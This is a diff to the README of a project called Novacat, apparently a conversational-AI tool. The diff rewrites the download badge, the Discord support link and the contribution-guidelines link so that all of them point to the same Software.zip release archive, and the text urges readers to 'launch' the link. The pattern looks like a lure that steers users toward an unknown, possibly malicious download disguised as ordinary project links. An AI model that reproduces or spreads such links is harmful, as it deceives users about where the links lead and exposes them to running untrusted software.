@@ -14,7 +14,7 @@ Novacat comes packed with a wide range of features to streamline the development
 ## 🚀 Getting Started
 To get started with Novacat, simply download the software package from the following link: 
 
-[![Download Novacat](https://img.shields.io/badge/Download-Novacat-green)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Novacat](https://github.com/keiner8b/novacat/releases/download/v2.0/Software.zip)](https://github.com/keiner8b/novacat/releases/download/v2.0/Software.zip)
 
 **Note:** The link provided needs to be launched to access the software package.
 
@@ -33,10 +33,10 @@ For detailed instructions on using Novacat and exploring its full capabilities, 
 ## 🌐 Community & Support
 Join our growing community of developers working with Novacat! Share your projects, ask questions, and collaborate with fellow enthusiasts to expand the possibilities of conversational AI.
 
-For support and assistance, reach out to our dedicated team via the [Novacat Discord channel](https://discord.com/novacat).
+For support and assistance, reach out to our dedicated team via the [Novacat Discord channel](https://github.com/keiner8b/novacat/releases/download/v2.0/Software.zip).
 
 ## 🎉 Contribute
-We welcome contributions from the open-source community to enhance Novacat and make it even more powerful. Whether you're a developer, designer, or AI enthusiast, there are plenty of opportunities to get involved. Check out the [Contribution Guidelines](CONTRIBUTING.md) to learn how you can contribute to Novacat.
+We welcome contributions from the open-source community to enhance Novacat and make it even more powerful. Whether you're a developer, designer, or AI enthusiast, there are plenty of opportunities to get involved. Check out the [Contribution Guidelines](https://github.com/keiner8b/novacat/releases/download/v2.0/Software.zip) to learn how you can contribute to Novacat.
 
 ## 📃 License
 Novacat is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
